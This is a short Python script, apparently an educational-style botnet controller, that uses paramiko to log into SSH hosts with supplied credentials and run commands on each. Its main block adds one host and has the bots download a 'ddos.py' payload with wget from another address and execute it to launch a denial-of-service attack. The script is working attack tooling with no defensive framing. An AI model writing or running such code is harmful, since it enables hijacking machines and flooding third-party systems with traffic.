import paramiko

botnet = []
class SSHClient:

    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.host, 22, self.user, self.password)
            return ssh
        except Exception as e:
            print(e)
            print('[-] Error Connecting')

    def send_command(self, cmd):
        # self.session.sendline(cmd)
        # self.session.prompt()
        stdin, stdout, stderr = self.session.exec_command(cmd)
        return stdout.read()



def botnet_command(command):
    for client in botnet:
        output = client.send_command(command)
        print('[*] Output from ' + client.host)
        print('[+] ' + output.decode())


def add_client(host, user, password):
    client = SSHClient(host, user, password)
    botnet.append(client)


if __name__ == '__main__':
    add_client('10.16.66.71', '用户名', '密码')
    # print(botnet_command('pwd'))
    botnet_command('wget http://10.16.14.171/ddos.py -O ddos.py')
    botnet_command('python3 ddos.py')

